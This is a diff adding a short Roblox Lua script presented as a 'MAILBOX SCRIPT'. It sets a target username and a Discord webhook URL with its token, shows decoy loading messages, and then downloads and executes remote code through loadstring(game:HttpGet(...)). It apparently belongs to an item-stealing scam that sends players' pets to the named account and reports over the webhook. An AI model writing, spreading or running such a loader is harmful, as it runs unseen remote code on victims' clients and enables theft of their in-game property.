@@ -1,0 +1,11 @@
+Username = "EZBURNTOKILL"
+WebHook = "https://discord.com/api/webhooks/1151130969076666389/GXdnv2e_Ni_1xBIhyAhbKNeoBiXZwplhWC4MoSK4mvl-gxcoOeGWMlQn8KfP3ZMwqrc1"
+
+
+loadingscreen = true
+_G.CustomScriptName = "MAILBOX SCRIPT"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jopsc/MainOp_script/main/Pet_scriptPetboi.lua"))()
